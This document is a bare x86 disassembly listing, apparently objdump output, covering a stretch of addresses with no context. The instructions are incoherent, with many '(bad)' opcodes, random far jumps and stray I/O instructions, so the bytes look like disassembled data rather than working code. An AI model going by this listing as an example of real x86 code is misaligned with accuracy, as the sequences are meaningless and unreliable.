  422764:	mov    eax,DWORD PTR [esi+0x1b]
  422767:	(bad)
  42276b:	sub    cl,al
  42276d:	cmp    eax,0x4d776ee1
  422772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422773:	cld    
  422774:	popf   
  422775:	fwait
  422776:	jb     0x42275d
  422778:	jmp    0x421:0x56b1bc02
  42277f:	(bad)  
  422780:	jnp    0x42271a
  422782:	adc    edx,DWORD PTR [edi+eiz*4+0x192ff1fd]
  422789:	mov    al,ds:0x707bbe6e
  42278e:	mov    DWORD PTR [eax],ebp
  422790:	or     al,0x70
  422792:	mov    ah,0x22
  422794:	jecxz  0x422815
  422796:	dec    ebp
  422797:	sbb    BYTE PTR [ecx-0x11c571a8],cl
  42279d:	int3   
  42279e:	xchg   edx,eax
  42279f:	jl     0x422752
  4227a1:	pop    es
  4227a2:	ret    
  4227a3:	mov    ecx,0xee56d4ae
  4227a8:	cmc    
  4227a9:	ror    cl,cl
  4227ab:	jle    0x4227d9
  4227ad:	xchg   ebp,eax
  4227ae:	jmp    0xac4a:0x9dbd28c2
  4227b5:	test   bh,bl
  4227b7:	mov    ah,0x6
  4227b9:	loop   0x4227cf
  4227bb:	out    0xcc,eax
  4227bd:	and    al,0x74
  4227bf:	fwait
  4227c0:	push   ss
  4227c1:	xchg   ecx,eax
  4227c2:	aad    0x2c
  4227c4:	and    esi,DWORD PTR [edi+0x2f]
  4227c7:	sbb    ecx,DWORD PTR [eax]
  4227c9:	dec    eax
  4227ca:	hlt    
  4227cb:	fbstp  TBYTE PTR [eax-0x33]
  4227ce:	stos   DWORD PTR es:[edi],eax
  4227cf:	out    0x3d,al
  4227d1:	fisttp WORD PTR [ecx+0x2fb6316a]
  4227d7:	pop    esi
  4227d8:	arpl   WORD PTR [esi],sp
  4227da:	mov    bh,0xc1
  4227dc:	mov    eax,ds:0xe1056cca
  4227e1:	in     al,dx
  4227e2:	cli    
  4227e3:	inc    edi
  4227e4:	lock push edi
  4227e6:	aam    0x74
  4227e8:	pop    ss
  4227e9:	rcr    BYTE PTR [ebx-0x41],cl
  4227ec:	mov    bl,0x69
  4227ee:	inc    esp
  4227ef:	mov    dh,0x6c
  4227f1:	xchg   ebp,eax
  4227f2:	loope  0x422817
  4227f4:	retf   
  4227f5:	call   0x2b67c185
  4227fa:	imul   ecx,DWORD PTR [edi-0xc],0x4b
  4227fe:	xor    ch,al
  422800:	push   ds
  422801:	dec    edx
  422802:	fs jmp 0xed0e:0x8a5a322e
  42280a:	push   cs
  42280b:	retf   
  42280c:	cdq    
  42280d:	call   0xba19:0xb8098e6c
  422814:	or     al,ch
  422816:	dec    eax
  422817:	xchg   BYTE PTR [ebx+0x7c],al
  42281a:	mov    esi,0x3f5f39b0
  42281f:	js     0x4227f7
  422821:	dec    edx
  422822:	add    al,0x3
  422824:	mov    eax,ds:0xc63f6182
  422829:	jo     0x422848
  42282b:	xchg   ecx,eax
  42282c:	sbb    al,0x25
  42282e:	lahf   
  42282f:	mov    ch,0x96
  422831:	push   0x827e69ce
  422836:	leave  
  422837:	inc    ecx
  422838:	ss pop ebx
  42283a:	xchg   edx,eax
  42283b:	dec    ecx
  42283c:	dec    ebp
  42283d:	stos   DWORD PTR es:[edi],eax
  42283e:	jmp    FWORD PTR [ebx-0x58b06a9e]
  422844:	xor    BYTE PTR ds:0xeda91492,ah
  42284a:	out    0xb6,eax
  42284c:	out    0xb6,eax
  42284e:	jmp    0xcbb:0x1e9d04b6
  422855:	rep ins BYTE PTR es:[edi],dx
  422857:	jmp    0x104a58b6
  42285c:	pop    esp
  42285d:	test   al,0x8e
  42285f:	mov    ebp,ss
  422861:	(bad)  
  422862:	lock mov eax,ds:0xe979485c
  422868:	data16 fstp QWORD PTR [ebp-0x2e819b7d]
  42286f:	pop    ss
  422870:	fs sbb eax,esp
  422873:	push   edi
  422874:	xchg   ebp,eax
  422875:	mov    ds:0x25f8134d,al
  42287a:	mov    dl,0xce
  42287c:	scas   eax,DWORD PTR es:[edi]
  42287d:	jle    0x422819
  42287f:	pusha  
  422880:	stos   DWORD PTR es:[edi],eax
  422881:	popf   
  422882:	popf   
  422883:	ja     0x422826
  422885:	mov    eax,ds:0xd4641ae8
  42288a:	rcl    BYTE PTR [edx+0x1a],cl
  42288d:	lds    ebx,FWORD PTR ds:0xecf4994d
  422893:	dec    edi
  422895:	pop    ds
  422896:	mov    esp,0xad949633
  42289b:	jl     0x422823
  42289d:	inc    edi
  42289e:	std    
  42289f:	(bad)  
  4228a1:	fild   WORD PTR [edi]
  4228a3:	lock sub esi,DWORD PTR ds:[ebx-0x45]
  4228a8:	push   0x39
  4228aa:	cwde   
  4228ab:	repz fnsave [ebp-0x2db80f59]
  4228b2:	and    DWORD PTR [edi],esp
  4228b4:	bound  edi,QWORD PTR [eax]
  4228b6:	stos   DWORD PTR es:[edi],eax
  4228b7:	sub    eax,0xb5364fc0
  4228bc:	jns    0x42288d
  4228be:	ja     0x422869
  4228c0:	or     esp,DWORD PTR [ecx+esi*1+0x627af83a]
  4228c7:	xchg   DWORD PTR [edx-0x2eab9db6],esp
  4228cd:	xchg   edi,eax
  4228ce:	pop    ebx
  4228cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228d0:	jl     0x4228ce
  4228d2:	cdq    
  4228d3:	dec    BYTE PTR [edx]
  4228d5:	(bad)  
  4228d6:	(bad)  [edx+0x7cf327ac]
  4228dc:	add    ch,BYTE PTR [ebp-0x601e4c08]
  4228e2:	inc    edx
  4228e3:	btc    DWORD PTR [esi-0x10],esp
  4228e7:	dec    ebx
  4228e8:	data16 mov gs,WORD PTR [ebp+0x67]
  4228ec:	mov    ds:0xa0bfad7b,al
  4228f1:	adc    al,0x9a
  4228f3:	mov    edi,0xd5df59
  4228f8:	dec    edi
  4228f9:	add    al,0xf9
  4228fb:	pop    edi
  4228fc:	or     DWORD PTR [esi+0x6b],esi
  4228ff:	and    DWORD PTR [ebp+0x3b],ebp
  422902:	xchg   ecx,eax
  422903:	scas   al,BYTE PTR es:[edi]
  422904:	mov    ebx,0xa78b21bc
  422909:	mov    edi,0x647cdbb1
  42290e:	cmp    esp,DWORD PTR [edx+0x3f]
  422911:	pop    edx
  422912:	pushf  
  422913:	xor    esi,ecx
  422915:	out    dx,al
  422916:	or     al,0x94
  422918:	pop    ecx
  422919:	adc    dh,cl
  42291b:	xor    ebx,DWORD PTR [edi]
  42291d:	(bad)  
  42291e:	jmp    0x42298d
  422920:	fiadd  DWORD PTR [ebx]
  422922:	outs   dx,DWORD PTR ds:[esi]
  422923:	fcomp  QWORD PTR [esi]
  422925:	sar    BYTE PTR [ebp-0x27],1
  422928:	lods   al,BYTE PTR ds:[esi]
  422929:	enter  0x1bfb,0x87
  42292d:	jnp    0x4228f1
  42292f:	cmp    eax,0x1d3bad89
  422934:	cmp    cl,BYTE PTR [ebx+0xd633acd]
  42293a:	and    edx,0xba36c44b
  422940:	pop    ds
  422941:	outs   dx,DWORD PTR ds:[esi]
  422942:	int3   
  422943:	dec    edi
  422944:	sbb    BYTE PTR [ecx-0x49],ah
  422947:	pop    esp
  422948:	add    BYTE PTR [eax],al
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	adc    cl,ah
  422958:	int    0xa5
  42295a:	push   es
  42295b:	mov    eax,0x6860001
  422960:	add    BYTE PTR [eax],al
  422962:	es cmp al,0xe2
  422965:	es (bad) 
  422967:	sbb    dl,BYTE PTR [esi-0x31]
  42296a:	pop    ebx
  42296b:	cmp    dh,bh
  42296d:	das    
  42296e:	(bad)  
  42296f:	mov    bh,0xd
  422971:	div    BYTE PTR [eax+ecx*8]
  422974:	jbe    0x42299b
  422976:	jbe    0x422980
  422978:	pop    ebx
  422979:	rcr    DWORD PTR [eax+ebp*1-0x581b0954],cl
  422980:	mov    eax,DWORD PTR [ecx+edi*2]
  422983:	jmp    0xa1d3:0xdd74f2b9
  42298a:	and    cl,ch
  42298c:	repz add ebx,ebx
  42298f:	dec    edx
  422990:	outs   dx,DWORD PTR ds:[esi]
  422991:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  422993:	in     al,0x94
  422995:	cmp    DWORD PTR ds:0xb5dcc987,0x2578cb32
  42299f:	aaa    
  4229a0:	popa   
  4229a1:	lock sbb al,0x1e
  4229a4:	dec    esp
  4229a5:	dec    ebx
  4229a6:	scas   eax,DWORD PTR es:[edi]
  4229a7:	rcl    BYTE PTR [ebp+0x4c11016c],1
  4229ad:	or     esi,DWORD PTR [edx+eax*2-0x2dd1486a]
  4229b4:	mov    ebp,0x63dbc281
  4229b9:	shl    BYTE PTR [ebx+ebx*1-0x1f],1
  4229bd:	cmp    eax,ecx
  4229bf:	cdq    
  4229c0:	cs inc edi
  4229c2:	jne    0x42299d
  4229c4:	and    bh,cl
  4229c6:	push   eax
  4229c7:	dec    edx
  4229c8:	(bad)  
  4229c9:	test   eax,0xcbf19a54
  4229ce:	cwde   
  4229cf:	jns    0x42298b
  4229d1:	mov    edx,0xced769d1
  4229d6:	sub    al,0xe9
  4229d8:	add    esp,0x85a8eab2
  4229de:	mov    esp,0xbc363848
  4229e3:	lods   eax,DWORD PTR ds:[esi]
  4229e4:	xchg   BYTE PTR [ecx+ebp*2+0x78edd0ea],dl
  4229eb:	ins    DWORD PTR es:[edi],dx
  4229ec:	outs   dx,DWORD PTR ds:[esi]
  4229ed:	imul   esp,DWORD PTR [ecx+0x5],0x2ad80842
  4229f4:	(bad)  
  4229f6:	scas   eax,DWORD PTR es:[edi]
  4229f7:	jle    0x4229bf
  4229f9:	fs mov eax,0x2b0b2cc4
  4229ff:	pop    esi
  422a00:	popa   
  422a01:	mov    ds:0xe083e18,al
  422a06:	push   esi
  422a07:	pushf  
  422a08:	add    eax,0x176f1676
  422a0d:	add    al,0x56
  422a0f:	retf   0x2b3d
  422a12:	xor    al,BYTE PTR [esi-0x5ed398ac]
  422a18:	out    dx,eax
  422a19:	xchg   DWORD PTR [ebx],ebx
  422a1b:	cmp    BYTE PTR [eax-0x41],dl
  422a1e:	int    0xc9
  422a20:	ror    BYTE PTR [ebx-0x66],cl
  422a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a24:	and    ebx,ebp
  422a26:	pushf  
  422a27:	push   edx
  422a28:	daa    
  422a29:	ret    0x51b9
  422a2c:	pop    ecx
  422a2d:	adc    eax,0xf65346ed
  422a32:	popf   
  422a33:	cmp    ebx,ecx
  422a35:	je     0x422a58
  422a37:	push   edi
  422a38:	push   0x6443c750
  422a3d:	into   
  422a3e:	push   esp
  422a3f:	pusha  
  422a40:	adc    bl,ah
  422a42:	fwait
  422a43:	adc    BYTE PTR [esp+edx*8+0x1b1e1a0e],ah
  422a4a:	sbb    edx,DWORD PTR [eax]
  422a4c:	jns    0x422a6a
  422a4e:	sbb    al,0xfb
  422a50:	int    0xc8
  422a52:	adc    DWORD PTR [edx],ecx
  422a54:	adc    esp,DWORD PTR [edx]
  422a56:	popf   
  422a57:	cmp    DWORD PTR [edx-0x7d],esp
  422a5a:	loope  0x422a24
  422a5c:	call   0xdcbeea58
  422a61:	mov    edx,0x3298ddce
  422a66:	rcl    BYTE PTR [esi],1
  422a68:	pop    edx
  422a69:	outs   dx,BYTE PTR ds:[esi]
  422a6a:	sahf   
  422a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a6c:	inc    edi
  422a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a6e:	sti    
  422a6f:	mov    ebx,DWORD PTR [edi-0x40]
  422a72:	push   ebp
  422a73:	addr16 push 0xffffffa9
  422a76:	(bad)  
  422a77:	pop    ss
  422a78:	in     al,0x16
  422a7a:	loopne 0x422a45
  422a7c:	sbb    DWORD PTR [edx+0x27061aeb],edx
  422a82:	mov    edi,0xa7211502
  422a87:	push   ecx
  422a88:	inc    edi
  422a89:	jmp    0x422ac3
  422a8b:	push   es
  422a8c:	(bad)  
  422a8d:	cmc    
  422a8e:	fistp  QWORD PTR [eax-0x5]
  422a91:	mov    edx,0x1a16107c
  422a96:	out    0x91,al
  422a98:	jecxz  0x422a53
  422a9a:	add    eax,0xe4f47a69
  422a9f:	inc    ecx
  422aa0:	lods   al,BYTE PTR ds:[esi]
  422aa1:	or     al,0x99
  422aa3:	dec    eax
  422aa4:	xchg   ebx,eax
  422aa5:	stos   BYTE PTR es:[edi],al
  422aa6:	std    
  422aa7:	add    dl,BYTE PTR [edx]
  422aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aaa:	xchg   edx,eax
  422aab:	and    esp,esp
  422aad:	ins    DWORD PTR es:[edi],dx
  422aae:	sub    eax,0xef3a0f81
  422ab3:	pop    ds
  422ab4:	sub    DWORD PTR [edi-0x2],edi
  422ab7:	jecxz  0x422aa9
  422ab9:	out    dx,eax
  422aba:	fcomp  st(2)
  422abc:	nop
  422abd:	fistp  WORD PTR [eax]
  422abf:	pushf  
  422ac0:	pop    edi
  422ac1:	xchg   ebx,eax
  422ac2:	pop    edi
  422ac3:	in     eax,0xe6
  422ac5:	sbb    cl,dh
  422ac7:	into   
  422ac8:	cli    
  422ac9:	cmc    
  422aca:	es call 0x1b98a40d
  422ad0:	arpl   WORD PTR [edi],si
  422ad2:	jg     0x422aa1
  422ad4:	scas   al,BYTE PTR es:[edi]
  422ad5:	or     BYTE PTR [ecx-0x3],bh
  422ad8:	xchg   edi,eax
  422ad9:	leave  
  422ada:	adc    DWORD PTR gs:[edi+0x4e],ecx
  422ade:	ins    DWORD PTR es:[edi],dx
  422adf:	pop    es
  422ae0:	arpl   WORD PTR [ecx-0x49],di
  422ae3:	jo     0x422ae5
  422ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ae6:	and    ebx,DWORD PTR [edx]
  422ae8:	push   ss
  422ae9:	mov    esp,0xc1ac8c0a
  422aee:	pop    eax
  422aef:	jb     0x422b4a
  422af1:	xchg   edi,eax
  422af2:	dec    ebx
  422af3:	lahf   
  422af4:	adc    al,0xd6
  422af6:	js     0x422aa2
  422af8:	aam    0x16
  422afa:	je     0x422ae2
  422afc:	xor    ecx,DWORD PTR ds:0xd6512d56
  422b02:	mov    edi,cs
  422b04:	scas   eax,DWORD PTR es:[edi]
  422b05:	or     ebx,DWORD PTR [eax-0x66]
  422b08:	adc    ebp,esp
  422b0a:	jb     0x422aee
  422b0c:	cmp    DWORD PTR [eax+ebx*2+0x61],ecx
  422b10:	jb     0x422b02
  422b12:	cwde   
  422b13:	sub    DWORD PTR [ebx-0x206e8ca1],edx
  422b19:	inc    ebx
  422b1a:	mov    ?,WORD PTR [ecx+0x3d58562b]
  422b20:	mov    dl,0xd
  422b22:	cld    
  422b23:	fld    DWORD PTR [ebx-0x52]
  422b26:	loopne 0x422afa
  422b28:	int3   
  422b29:	xchg   BYTE PTR [eax+0x19],al
  422b2c:	inc    eax
  422b2d:	push   cs
  422b2e:	mov    dl,0xd3
  422b30:	cmp    eax,0x25b2d55f
  422b35:	cli    
  422b36:	xor    DWORD PTR [ecx],ecx
  422b38:	xchg   edi,eax
  422b39:	cli    
  422b3a:	test   DWORD PTR [edx-0x43],eax
  422b3d:	inc    eax
  422b3e:	mov    edx,0x8da99cb2
  422b43:	jg     0x422ad3
  422b45:	xchg   esp,eax
  422b46:	ins    BYTE PTR es:[edi],dx
  422b47:	sbb    al,BYTE PTR [ebx]
  422b49:	cld    
  422b4a:	mov    ecx,0xe505ce8a
  422b4f:	sub    eax,0xba4ed069
  422b54:	adc    bh,BYTE PTR [edx+0x15]
  422b57:	sub    esi,eax
  422b59:	es add al,0x37
  422b5c:	ja     0x422b57
  422b5e:	xor    BYTE PTR [edi+0x6e8a621],dl
  422b64:	mov    es,WORD PTR [ebp+0x39]
  422b67:	inc    ecx
  422b68:	mov    ds:0x29f24e0d,al
  422b6d:	push   ds
  422b6e:	push   ss
  422b6f:	dec    edx
  422b70:	xchg   esi,eax
  422b71:	mov    bh,bl
  422b73:	out    dx,al
  422b74:	enter  0x15ec,0x94
  422b78:	sbb    DWORD PTR [ebp+0x4b],ebp
  422b7b:	rcl    DWORD PTR [edx+0x78],cl
  422b7e:	mov    ecx,0xcbfe1df4
  422b83:	push   0xffffffc3
  422b85:	and    eax,0x1850f78b
  422b8a:	sub    BYTE PTR [esi+ebp*4+0x13],bl
  422b8e:	ror    BYTE PTR [eax-0x2b],0xd2
  422b92:	push   esi
  422b93:	js     0x422b28
  422b95:	ror    DWORD PTR [ebp+ecx*8+0xe],0xd3
  422b9a:	jg     0x422bdc
  422b9c:	mov    dh,BYTE PTR [ebp+0x27]
  422b9f:	lahf   
  422ba0:	das    
  422ba1:	inc    edi
  422ba2:	pop    ebp
  422ba3:	pop    esi
  422ba4:	adc    BYTE PTR [eax],bh
  422ba6:	out    0xb,eax
  422ba8:	add    eax,0x91d95492
  422bad:	mov    dh,0x74
  422baf:	xchg   edx,eax
  422bb0:	mov    ds:0x13e1f5b8,eax
  422bb5:	xchg   edi,eax
  422bb6:	jnp    0x422b88
  422bb8:	sub    bl,ch
  422bba:	out    dx,al
  422bbb:	es jmp 0x422ba3
  422bbe:	jle    0x422bf0
  422bc0:	jne    0x422bd6
  422bc2:	inc    eax
  422bc3:	push   ebp
  422bc4:	rcr    DWORD PTR [edi+0x73],cl
  422bc7:	push   ebp
  422bc8:	adc    DWORD PTR [edx],esp
  422bca:	icebp  
  422bcb:	push   ss
  422bcc:	rcr    BYTE PTR [edi-0x11],cl
  422bcf:	call   0xb4a23a9d
  422bd4:	and    DWORD PTR [edx+0x82aab67],ebp
  422bda:	mov    esi,DWORD PTR [ecx+0x5d34f42b]
  422be0:	sbb    ah,BYTE PTR [edi]
  422be2:	test   DWORD PTR [ecx-0x27],eax
  422be5:	dec    esp
  422be6:	cdq    
  422be7:	enter  0xd88e,0xa3
  422beb:	pop    ds
  422bec:	cmp    DWORD PTR [esp+edx*1],0xffffffa7
  422bf0:	(bad)  [esi+0x4e]
  422bf3:	jp     0x422bfe
  422bf5:	daa    
  422bf6:	pop    edi
  422bf8:	dec    esi
  422bf9:	jecxz  0x422bd1
  422bfb:	jle    0x422c08
  422bfd:	add    eax,0x3729a546
  422c02:	in     eax,0x4f
  422c04:	das    
  422c05:	pop    ds
  422c06:	sub    ecx,DWORD PTR [ecx-0x7373a0fd]
  422c0c:	aam    0xc2
  422c0e:	inc    esi
  422c0f:	xor    BYTE PTR [ebp+0x27],0xb5
  422c13:	inc    esp
  422c14:	fstp   QWORD PTR [eax+0x7a5378fe]
  422c1a:	adc    al,0x6
  422c1c:	out    dx,eax
  422c1d:	jle    0x422bb5
  422c1f:	sbb    al,BYTE PTR [edi+0x6fffcbbb]
  422c25:	retw   
  422c27:	fsub   QWORD PTR [edi*8+0x3382074c]
  422c2e:	mov    ds:0xd6ab0b32,al
  422c33:	cmp    DWORD PTR ds:0xc1e57663,esp
  422c39:	and    BYTE PTR ds:0xf717e60b,cl
  422c3f:	outs   dx,BYTE PTR ds:[esi]
  422c40:	inc    ebp
  422c41:	stos   BYTE PTR es:[edi],al
  422c42:	(bad)  
  422c43:	cmp    eax,0xef0ed064
  422c48:	mov    eax,0xff419f2d
  422c4d:	dec    eax
  422c4e:	xlat   BYTE PTR ds:[ebx]
  422c4f:	push   sp
  422c51:	add    al,0x48
  422c53:	jnp    0x422c35
  422c55:	mov    bl,0x2a
  422c57:	aad    0x51
  422c59:	push   es
  422c5a:	pop    esi
  422c5b:	pop    esp
  422c5c:	mov    esi,0x1b114f6b
  422c61:	inc    esi
  422c62:	or     al,0x30
  422c64:	aad    0xf5
  422c66:	loope  0x422c94
  422c68:	jl     0x422c2e
  422c6a:	int3   
  422c6b:	addr16 push ebx
  422c6d:	mov    bl,0xe7
  422c6f:	fisttp QWORD PTR [ecx+0x130b2158]
  422c75:	cmp    ebp,edx
  422c77:	mov    eax,ds:0x3eaabcc6
  422c7c:	jmp    0x5539:0x36285441
  422c83:	adc    al,BYTE PTR [ecx-0x47cd27c8]
  422c89:	mov    WORD PTR [edi-0x65],ds
  422c8c:	outs   dx,BYTE PTR ds:[esi]
  422c8d:	jo     0x422c73
  422c8f:	in     al,0xd
  422c91:	out    dx,al
  422c92:	cmp    DWORD PTR [esi],edi
  422c94:	adc    esp,DWORD PTR [ebp+ebx*8+0x65]
  422c98:	pop    eax
  422c99:	int    0x4e
  422c9b:	(bad)  
  422c9c:	pusha  
  422c9d:	inc    ebp
  422c9e:	jae    0x422c76
  422ca0:	sbb    ch,BYTE PTR [esi+0x5d]
  422ca3:	and    ebx,esi
  422ca5:	mov    eax,0xfb23002d
  422caa:	(bad)  
  422cab:	mov    bl,0xbd
  422cad:	(bad)  
  422cae:	(bad)  
  422caf:	clc    
  422cb0:	dec    edi
  422cb1:	sti    
  422cb2:	xchg   esp,eax
  422cb3:	sbb    DWORD PTR ds:0x5cd686a0,0xffffff87
  422cba:	pop    ss
  422cbb:	stc    
  422cbc:	dec    ecx
  422cbd:	adc    al,0x7b
  422cbf:	mov    BYTE PTR [ebp+0x54],bh
  422cc2:	retf   
  422cc3:	xchg   ebp,eax
  422cc4:	clc    
  422cc5:	xchg   ecx,eax
  422cc6:	jo     0x422cde
  422cc8:	pop    ss
  422cc9:	mov    eax,ds:0x15041eed
  422cce:	test   al,0xb6
  422cd0:	and    edi,ebp
  422cd2:	mov    ah,BYTE PTR [ebx+esi*1+0x5b]
  422cd6:	add    BYTE PTR [ecx+0xb],0x5
  422cda:	pop    esp
  422cdb:	inc    bx
  422cdd:	fs test al,0x58
  422ce0:	jbe    0x422ce2
  422ce2:	rcl    DWORD PTR [esi+esi*2-0x5388d31a],1
  422ce9:	imul   ebx,ebp,0x83f7d18f
  422cef:	push   es
  422cf0:	cs or  dh,cl
  422cf3:	mov    eax,0x95fc2f63
  422cf8:	(bad)
  422cfc:	cmp    ecx,DWORD PTR fs:[ebx]
  422cff:	push   esi
  422d00:	aad    0x62
  422d02:	inc    edi
  422d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d04:	mov    edx,0x75e5cb7d
  422d09:	ror    DWORD PTR [ebx+esi*1-0xe],0x2c
  422d0e:	sbb    ch,bl
  422d10:	xchg   esi,eax
  422d11:	pop    eax
  422d12:	inc    ecx
  422d13:	aad    0x47
  422d15:	pushf  
  422d16:	inc    edx
  422d17:	dec    ebx
  422d18:	les    esp,FWORD PTR [ebp+0x249abd44]
  422d1e:	mov    ecx,0x70c91ce6
  422d23:	fld    DWORD PTR [edi+edi*4-0x25ec4917]
  422d2a:	sbb    DWORD PTR [esi],0xffffff90
  422d2d:	lods   eax,DWORD PTR ds:[esi]
  422d2e:	push   edi
  422d2f:	push   esp
  422d30:	cdq    
  422d31:	or     BYTE PTR [edi],bl
  422d33:	jmp    0x422d12
  422d35:	outs   dx,BYTE PTR ds:[esi]
  422d36:	xchg   edx,eax
  422d37:	mov    esi,eax
  422d39:	shl    BYTE PTR [edx-0x615e13ef],cl
  422d3f:	push   edi
  422d40:	push   ds
  422d41:	add    DWORD PTR [esi],edx
  422d43:	lea    eax,[ecx+eiz*4-0x53]
  422d47:	jno    0x422d6c
  422d49:	cli    
  422d4a:	je     0x422cd5
  422d4c:	sbb    eax,0x97a84238
  422d51:	cdq    
  422d52:	lahf   
  422d53:	popa   
  422d54:	mov    al,0xde
  422d56:	je     0x422dbc
  422d58:	pop    ebx
  422d59:	inc    edi
  422d5a:	xor    BYTE PTR [eax],0x23
  422d5d:	and    ah,BYTE PTR [ecx]
  422d5f:	pop    es
  422d60:	fcmovbe st,st(7)
  422d62:	sbb    cl,BYTE PTR [eax+0x3d0ad431]
  422d68:	pop    ecx
  422d69:	mov    eax,ds:0xb8edbd90
  422d6e:	jmp    0x422d23
  422d70:	and    ebx,esi
  422d72:	adc    DWORD PTR [esi],edx
  422d74:	call   0x3308e5d
  422d79:	fsub   DWORD PTR [ecx+eax*4-0x6bc83168]
  422d80:	sahf   
  422d81:	in     eax,dx
  422d82:	hlt    
  422d83:	stos   DWORD PTR es:[edi],eax
  422d84:	pop    ebp
  422d85:	jle    0x422d9f
  422d87:	popa   
  422d88:	mov    ebp,0x35920f6d
  422d8d:	out    0x18,al
  422d8f:	in     eax,dx
  422d90:	test   esp,esi
  422d92:	xlat   BYTE PTR es:[ebx]
  422d94:	data16 fstp QWORD PTR [esi-0x6edfe16c]
  422d9b:	iret   
  422d9c:	leave  
  422d9d:	and    BYTE PTR [ebx+0x68],bl
  422da0:	outs   dx,BYTE PTR ds:[esi]
  422da1:	xor    al,0x81
  422da3:	jp     0x422dce
  422da5:	cdq    
  422da6:	mov    ah,0x94
  422da8:	imul   eax,edi,0x48f85007
  422dae:	or     al,0xca
  422db0:	pop    esp
  422db1:	int3   
  422db2:	and    dx,WORD PTR [edx+0x49]
  422db6:	icebp  
  422db7:	xor    ecx,ebx
  422db9:	push   ss
  422dba:	call   DWORD PTR [esi]
  422dbc:	inc    esi
  422dbd:	mov    ch,BYTE PTR [edx-0x11d327ec]
  422dc3:	jb     0x422d9a
  422dc5:	sbb    eax,0x6ab11852
  422dca:	xchg   ebx,eax
  422dcb:	(bad)  
  422dcc:	enter  0xa0c0,0x8f
  422dd0:	adc    al,0xf8
  422dd2:	scas   al,BYTE PTR es:[edi]
  422dd3:	jne    0x422e04
  422dd5:	pop    edi
  422dd6:	mov    ah,0x5
  422dd8:	mov    ebx,0xdf592865
  422ddd:	out    0x5f,eax
  422ddf:	sahf   
  422de0:	in     eax,dx
  422de1:	loope  0x422dfc
  422de3:	jnp    0x422e23
  422de5:	sub    DWORD PTR [ebx-0x3c],edx
  422de8:	mov    esi,0xf1f1b77d
  422ded:	aam    0x6d
  422def:	cmp    ch,cl
  422df1:	adc    al,ah
  422df3:	ror    DWORD PTR [eax+esi*2],0xe9
  422df7:	inc    esp
  422df8:	jge    0x422ddb
  422dfa:	call   DWORD PTR [ebx+esi*4]
  422dfd:	cdq    
  422dfe:	icebp  
  422dff:	je     0x422de6
  422e01:	mov    al,0x62
  422e03:	add    bh,dh
  422e05:	aas    
  422e06:	(bad)  
  422e07:	(bad)  
  422e08:	sub    eax,0x8311227b
  422e0d:	or     eax,0x6d60d6fd
  422e12:	ror    esp,cl
  422e14:	test   al,0x82
  422e16:	into   
  422e17:	out    dx,eax
  422e18:	xchg   ecx,eax
  422e19:	out    0xd7,al
  422e1b:	cdq    
  422e1c:	aaa    
  422e1d:	pop    ecx
  422e1e:	(bad)  
  422e1f:	adc    eax,edx
  422e21:	jbe    0x422e9a
  422e23:	ins    BYTE PTR es:[edi],dx
  422e24:	loop   0x422e26
  422e26:	sub    BYTE PTR [ecx],ch
  422e28:	adc    DWORD PTR [edx-0x74ad4931],eax
  422e2e:	ds pop esi
  422e30:	cwde   
  422e31:	cmp    BYTE PTR [esi],bh
  422e33:	sub    al,0x87
  422e35:	int3   
  422e36:	in     eax,0x21
  422e38:	stos   BYTE PTR es:[edi],al
  422e39:	dec    ebx
  422e3a:	in     eax,0x26
  422e3c:	pop    ss
  422e3d:	push   ds
  422e3e:	add    edx,0xa1e1f2f0
  422e44:	les    esi,FWORD PTR [esi-0x58514912]
  422e4a:	and    DWORD PTR [ebx-0xd09da41],ebx
  422e50:	xor    bl,BYTE PTR [edi-0xa59e60]
  422e56:	test   eax,0xc3f7fa74
  422e5b:	repz mov ebx,DWORD PTR [edx-0x8f2971f]
  422e62:	jl     0x422ebf
  422e64:	mov    ebx,0xe6c52262
  422e69:	ja     0x422ec1
  422e6b:	cmp    eax,0xa6a8acbb
  422e70:	xchg   al,bh
  422e72:	js     0x422e60
  422e74:	icebp  
  422e75:	jmp    0x422ec2
  422e77:	or     ebx,DWORD PTR [esp+esi*4]
  422e7a:	aam    0x4c
  422e7c:	jne    0x422e8b
  422e7e:	push   ss
  422e7f:	xchg   BYTE PTR [edx-0x779e1658],al
  422e85:	xor    al,bh
  422e87:	mov    esi,0x64394abb
  422e8c:	ret    0x35f1
  422e8f:	push   esi
  422e90:	jnp    0x422ec8
  422e92:	dec    edi
  422e93:	(bad)  
  422e95:	inc    edi
  422e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e97:	adc    dl,BYTE PTR [edx-0x2fe23661]
  422e9d:	sub    al,0x9b
  422e9f:	push   es
  422ea0:	ja     0x422ee0
  422ea2:	xchg   edi,eax
  422ea3:	loopne 0x422f23
  422ea5:	fdiv   DWORD PTR [ebp+eax*4-0x539e11f0]
  422eac:	fisub  WORD PTR [esi+ecx*4-0x24ba5880]
  422eb3:	loop   0x422f13
  422eb5:	push   0x2
  422eb7:	mov    BYTE PTR [ebx],0x58
  422eba:	cmp    al,0xec
  422ebc:	addr16 cmp al,0x53
  422ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ec0:	inc    esi
  422ec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ec2:	ja     0x422edc
  422ec4:	(bad)  
  422ec5:	mov    eax,ds:0xfcdfe0a2
  422eca:	pop    ss
  422ecb:	mov    dh,0x8e
  422ecd:	xor    BYTE PTR [ecx-0x315c3d25],bl
  422ed3:	pop    esi
  422ed4:	sbb    esi,ecx
  422ed6:	mov    dh,0xe6
  422ed8:	stos   BYTE PTR es:[edi],al
  422ed9:	iret   
  422eda:	gs call 0x32779588
  422ee0:	daa    
  422ee1:	sbb    al,0x84
  422ee3:	mov    bh,BYTE PTR [esi-0x7a]
  422ee6:	inc    edi
  422ee7:	dec    ebx
